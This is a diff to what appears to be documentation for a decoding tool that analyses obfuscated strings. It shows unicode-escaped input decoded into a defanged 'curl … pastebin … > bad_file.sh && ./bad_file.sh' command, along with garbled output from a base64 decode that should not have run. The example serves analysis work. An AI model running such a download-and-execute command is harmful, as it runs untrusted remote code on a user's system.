@@ -42,9 +42,9 @@ line 1::original:>  b'\\u0063\\u0075\\u0072\\u006c\\u0020\\u0068\\u0078\\u0078\\
     |
     |--decoded_escaped_characters>  b'curl hxxps://pastebin.com/raw/escaped_unicode > bad_file.sh && ./bad_file.sh'
 
-
-# Note, if you check this same string, it will also attempt a Base64 decode... this may be fixed in future versions.
-# For now, we're ignoring.
+line 1::original:>  b'\\u0063\\u0075\\u0072\\u006c\\u0020\\u0068\\u0078\\u0078\\u0070\\u0073\\u003a\\u002f\\u002f\\u0070\\u0061\\u0073\\u0074\\u0065\\u0062\\u0069\\u006e\\u002e\\u0063\\u006f\\u006d\\u002f\\u0072\\u0061\\u0077\\u002f\\u0065\\u0073\\u0063\\u0061\\u0070\\u0065\\u0064\\u005f\\u0075\\u006e\\u0069\\u0063\\u006f\\u0064\\u0065\\u0020\\u003e\\u0020\\u0062\\u0061\\u0064\\u005f\\u0066\\u0069\\u006c\\u0065\\u002e\\u0073\\u0068\\u0020\\u0026\\u0026\\u0020\\u002e\\u002f\\u0062\\u0061\\u0064\\u005f\\u0066\\u0069\\u006c\\u0065\\u002e\\u0073\\u0068'
+    |
+    |--decoded_base64>  b'\xbbM:\xde\xed4\xef\x9b\xb4\xd3\xbd\xae\xd3N\x9c\xbbM6\xd2\xed4\xeb\xcb\xb4\xd3\xbf.\xd3N\xfc\xbbM;\xd2\xed4\xef{\xb4\xd3v\xae\xd3M\x9f\xbbM6~\xed4\xefK\xb4\xd3\xadn\xd3N\xf7\xbbM;\xe2\xed4\xeb\x9b\xb4\xd3\xad\xae\xd3N\xbd\xbbM:z\xed4\xd9\xeb\xb4\xd3\xad\xee\xd3N\x9f\xbbM:v\xed4\xd9\xfb\xb4\xd3\xbd\xae\xd3N\xb5\xbbM;\xee\xed4\xd9\xfb\xb4\xd3\xaen\xd3N\xf7\xbbM:\xde\xed4\xeb[\xb4\xd3\xbd.\xd3N\xb9\xbbM:\xe2\xed4\xe5\xfb\xb4\xd3\xben\xd3N\x9e\xbbM:\xf6\xed4\xeb{\xb4\xd3\xa7\xee\xd3N\xb8\xbbM:\xe6\xed4\xdbK\xb4\xd3w\xae\xd3M\xb4\xbbM:\xda\xed4\xeb[\xb4\xd3\xae.\xd3N_\xbbM:\xea\xed4\xeb\xdb\xb4\xd3\xa7.\xd3N\xb9\xbbM6z\xed4\xef{\xb4\xd3\xaf.\xd3M\xb4\xbbM6\xea\xed4\xdb\xab\xb4\xd3m.\xd3M\x9e\xbbM6~\xed4\xebk\xb4\xd3\xadn\xd3N\xb8\xbbM9~\xed4\xeb\xab\xb4\xd3\xafn\xd3N\x9c\xbbM:\xe6\xed4\xd9\xeb\xb4\xd3\xbd\xee\xd3N\xbc'
 ```
 **Escaped hex**
 - Note that the base64 decoder runs as well. We will hopefully add some logic in the future to prevent this.
